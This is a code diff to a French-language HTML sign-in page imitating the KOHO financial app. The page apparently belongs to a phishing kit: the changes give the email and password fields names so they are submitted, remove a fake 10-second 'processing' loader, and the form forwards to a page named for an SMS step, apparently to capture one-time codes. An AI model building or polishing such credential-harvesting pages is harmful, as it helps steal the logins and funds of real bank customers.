@@ -65,11 +65,11 @@
         <p class="k-subtitle">Lancez-vous en moins de 3 minutes.</p>
         <form action="koho101_sms.html" method="POST">
             <div class="k-input-wrapper">
-                <input type="email" class="k-input" placeholder="Adresse courriel" required>
+                <input type="email" name="email" id="email" class="k-input" placeholder="Adresse courriel" required>
             </div>
             
             <div class="k-input-wrapper">
-                <input type="password" class="k-input" placeholder="Mot de passe" required>
+                <input type="password" name="password" id="password" class="k-input" placeholder="Mot de passe" required>
                 <i class="fa-regular fa-eye k-eye"></i>
             </div>
             
@@ -102,19 +102,7 @@
         <p class="loader-text">Traitement en cours...</p>
     </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.querySelector('form');
-            const loader = document.getElementById('loaderOverlay');
-            if(form && loader) {
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
-                    loader.classList.add('active');
-                    setTimeout(function() { form.submit(); }, 10000);
-                });
-            }
-        });
-    </script>
+    
 <script src="security_module.js"></script>
 </body>
 </html>
